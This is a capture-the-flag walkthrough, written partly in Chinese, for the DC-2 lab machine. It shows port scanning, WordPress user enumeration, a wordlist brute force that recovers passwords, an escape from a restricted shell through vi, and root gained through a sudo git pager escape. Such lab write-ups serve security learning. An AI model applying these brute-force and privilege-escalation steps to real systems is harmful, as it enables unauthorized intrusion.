# DC-2
![image](https://hackmd.io/_uploads/BJtR7GOnkg.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 192.168.117.194
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 05:53 EDT
Nmap scan report for 192.168.117.194
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.30 seconds

```
> 只有一個 80 port ?!

#### 1.2 /etc/hosts
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts                 
192.168.117.194 dc-2
```
#### 1.3 瀏覽 http
瀏覽 http://192.168.117.194\
![image](https://github.com/user-attachments/assets/a7d276f5-6f48-45db-8eb7-eb55cf007c83)
點選 "Flag": http://dc-2/index.php/flag/\
![image](https://hackmd.io/_uploads/B1bDx7O31l.png)
> 提示使用 `cewl` ?!

#### 1.4 WPScan
![image](https://hackmd.io/_uploads/SyCeZmu2Je.png)
```
┌──(chw㉿CHW)-[~]
└─$ wpscan --url http://dc-2/ --enumerate p --plugins-detection aggressive
...
[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'
...
[+] akismet
 | Location: http://dc-2/wp-content/plugins/akismet/
 | Last Updated: 2025-02-14T18:49:00.000Z
 | Readme: http://dc-2/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.3.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://dc-2/wp-content/plugins/akismet/, status: 200
 |
 | Version: 3.3.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://dc-2/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://dc-2/wp-content/plugins/akismet/readme.txt

```
> `twentyseventeen` 與 `akismet` out of date

### 2. searchsploit
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit twentyseventeen        
Exploits: No Results
Shellcodes: No Results
                       
┌──(chw㉿CHW)-[~]
└─$ searchsploit aggressive
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
IKE - Aggressive Mode Shared Secret Hash Leakage                                                                                       | hardware/remote/22532.txt
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
> 沒有可以利用的資訊

### 3. WPScan User
```
┌──(chw㉿CHW)-[~]
└─$ wpscan --url http://dc-2/ --enumerate u
...
[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
列出 username
```
┌──(chw㉿CHW)-[~]
└─$ cat username.txt                        
admin
jerry
tom
```
### 4. crewl
cewl 根據網站產生字典檔
```
┌──(chw㉿CHW)-[~]
└─$ cewl -w custom_wordlist.txt http://dc-2/

┌──(chw㉿CHW)-[~]
└─$ cat custom_wordlist.txt                 
sit
amet
nec
quis
vel
orci
site
...
```
### 5. wpscan 暴力破解
```
┌──(chw㉿CHW)-[~]
└─$ wpscan --url http://dc-2/ -U username.txt -P custom_wordlist.txt --force
...
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

```
> `jerry`:`adipiscing`\
> `tom`:`parturient`

### 6. 登入 Wordpress
在 Jerry 管理頁面中找到 /Flag2 Page
![image](https://hackmd.io/_uploads/BJnYAQ_3kl.png)
> 找到 Flag 2 的提示，但還是沒有利用點\
> 決定 nmap 掃描全部 port

### - Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -p- 192.168.117.194
Nmap scan report for 192.168.117.194
Host is up (0.098s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu

┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -p 7744  192.168.117.194
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 23:42 EDT
Nmap scan report for 192.168.117.194
Host is up (0.100s latency).

PORT     STATE SERVICE VERSION
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
### 7. SSH
使用 tom 成功登入
```
┌──(chw㉿CHW)-[~]
└─$ ssh tom@192.168.117.194 -p 7744
tom@192.168.117.194's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$ ls
flag3.txt  local.txt  usr
 
```

### ✅ Get User Flag
> 在 `/home/tom`找到 User flag
## Privileges Escalation
### 8. 查看 flag3.txt
```
tom@DC-2:~$ cat flag3.txt
-rbash: cat: command not found
tom@DC-2:~$ vi flag.txt
poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```
### 9. Vi 跳脫 restricted shell
先嘗試 Python 取得互動式 Shell
```
tom@DC-2:~$ echo $PATH
/home/tom/usr/bin
tom@DC-2:~$ export PATH=/bin:/usr/bin:$PATH
-rbash: PATH: readonly variable
tom@DC-2:~$ python -c 'import os; os.system("/bin/sh")'
-rbash: python: command not found
tom@DC-2:~$ python3 -c 'import os; os.system("/bin/sh")'
-rbash: python3: command not found
```
> 還是不行

使用 vi 可以 escape restricted shell，再加入 `/bin` 路徑
```
vi

:set shell=/bin/sh
:shell
$ whoami
/bin/sh: 1: whoami: not found
$ bash -i
/bin/sh: 2: bash: not found
$ su jerry
/bin/sh: 3: su: not found
$ export PATH=/bin:/usr/bin:$PATH
$ id
uid=1001(tom) gid=1001(tom) groups=1001(tom)
```
### 10. 使用 user jerry
```
$ su jerry
Password: 
jerry@DC-2:/home/tom$ ls /home/jerry
flag4.txt
jerry@DC-2:/home/tom$ cat flag4.txt
cat: flag4.txt: Permission denied
```
### 11. Sudo -l
```
jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

```
### 12. [GTFO](https://gtfobins.github.io/gtfobins/git/#sudo): git
```
jerry@DC-2:~$ sudo git -p help config
...
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
final-flag.txt  proof.txt
```
### ✅ Get Root FLAG
